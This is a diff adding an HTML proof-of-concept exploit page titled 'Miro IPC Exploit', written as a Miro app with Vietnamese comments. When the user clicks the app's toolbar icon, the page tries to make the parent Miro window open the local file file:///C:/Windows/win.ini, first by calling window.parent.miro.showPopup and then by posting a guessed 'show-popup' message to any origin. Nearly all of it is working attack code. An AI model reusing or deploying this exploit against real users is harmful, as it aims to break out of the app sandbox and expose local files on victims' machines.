@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Miro IPC Exploit</title>
+    <script src="https://miro.com/app/static/sdk/v2/miro.js"></script>
+</head>
+<body>
+    <div style="padding: 20px; font-family: sans-serif;">
+        <h3>Exploit Ready</h3>
+        <p>Click the app icon on the Miro toolbar to fire the payload.</p>
+    </div>
+
+    <script>
+        async function initMiroApp() {
+            try {
+                // Đăng ký sự kiện click vào icon App trên thanh công cụ
+                await miro.board.ui.on('icon:click', async () => {
+                    console.log("[+] Exploit triggered!");
+                    
+                    // Kịch bản 1: Gọi trực tiếp hàm showPopup của cửa sổ cha
+                    try {
+                        console.log("[*] Attempting window.parent.miro.showPopup...");
+                        if (window.parent && window.parent.miro) {
+                            window.parent.miro.showPopup('file:///C:/Windows/win.ini', 800, 600);
+                            console.log("[+] Method 1 executed.");
+                        } else if (window.top && window.top.miro) {
+                            window.top.miro.showPopup('file:///C:/Windows/win.ini', 800, 600);
+                            console.log("[+] Method 1 (top) executed.");
+                        }
+                    } catch (e1) {
+                        console.error("[-] Method 1 failed (CORS/Isolation):", e1);
+                    }
+
+                    // Kịch bản 2: Bắn PostMessage ép Parent Window tự mở (Nếu Miro có listener)
+                    try {
+                        console.log("[*] Attempting window.parent.postMessage...");
+                        window.parent.postMessage({
+                            type: 'show-popup', // Đoán tên event IPC của giao diện
+                            url: 'file:///C:/Windows/win.ini',
+                            width: 800,
+                            height: 600
+                        }, '*');
+                        console.log("[+] Method 2 executed.");
+                    } catch (e2) {
+                        console.error("[-] Method 2 failed:", e2);
+                    }
+                });
+                console.log("[+] Miro App initialized successfully.");
+            } catch (error) {
+                console.error("[-] Initialization failed:", error);
+            }
+        }
+
+        initMiroApp();
+    </script>
+</body>
+</html>
